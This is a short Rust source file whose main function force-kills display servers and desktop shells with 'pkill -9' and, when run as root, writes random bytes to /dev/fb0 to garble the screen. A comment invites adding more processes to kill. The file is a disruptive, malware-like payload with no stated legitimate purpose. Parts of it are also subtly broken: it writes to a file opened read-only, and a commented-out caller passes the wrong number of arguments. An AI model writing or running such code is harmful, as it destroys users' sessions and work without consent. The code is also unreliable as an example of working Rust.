#![no_main]
#![feature(let_chains)]

use std::process; 
use std::io::{Error, Write};
use std::fs::File;  
use rand::{Rng};

extern "C" { 
    fn check_root() -> i32;
}

// Pfff its to light for this project, but why not 

pub fn artifacts_and_kill(root: bool, iterations: i32) -> Result<(), std::io::Error> {
    std::process::Command::new("pkill")
    .args(&["-9", "Xorg", "xinit", "gnome-shell", "kwin_wayland", "plasmashell"]) 
    //TODO: Add more process names of the processes you want to kill
    .spawn().unwrap();

    if root == true /* && let mut Ok(fb) = std::fs::File::create("/dev/fb0") */ {
        let mut fb = std::fs::File::open("/dev/fb0").unwrap();
        let mut rng = rand::thread_rng();
        for _ in 0..iterations {
            let garbage: Vec<u8> = (0..1024).map(|_| rng.gen()).collect();
            let _ = fb.write(&garbage);
        }
        
    }

    Ok(())
}

/* 
fn init() -> Result<(), std::io::Error> {
    if check_root() == 0 {
        artifacts_and_kill(true)
    } else {
        artifacts_and_kill(false)
    }
}

*/
